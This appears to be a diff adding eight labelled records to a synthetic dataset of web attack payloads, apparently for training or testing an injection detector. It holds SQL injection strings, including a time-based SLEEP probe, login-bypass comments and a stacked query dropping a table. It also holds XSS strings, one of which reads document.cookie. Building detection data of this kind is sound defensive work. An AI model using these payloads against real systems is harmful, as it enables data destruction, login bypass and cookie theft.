+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "5312\"%20AND%20SLeEp(6)--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "auth_bypass", "profile": "polymorphic", "payload": "manAger'#", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "boolean_blind", "profile": "polymorphic", "payload": "9\" aNd 9=27-- commENt", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "&#X3c;sCripT&#X3e;AleRT(1)&#x3c;/scriPt&#x3e;", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "auth_bypass", "profile": "polymorphic", "payload": "sUpPoRt53'-- -", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "stacked_query", "profile": "polymorphic", "payload": "4096;/**/DROP/**/TABLE/**/employees--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<script>alert(document.title)</script>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "javascript:alert(document.cookie)", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
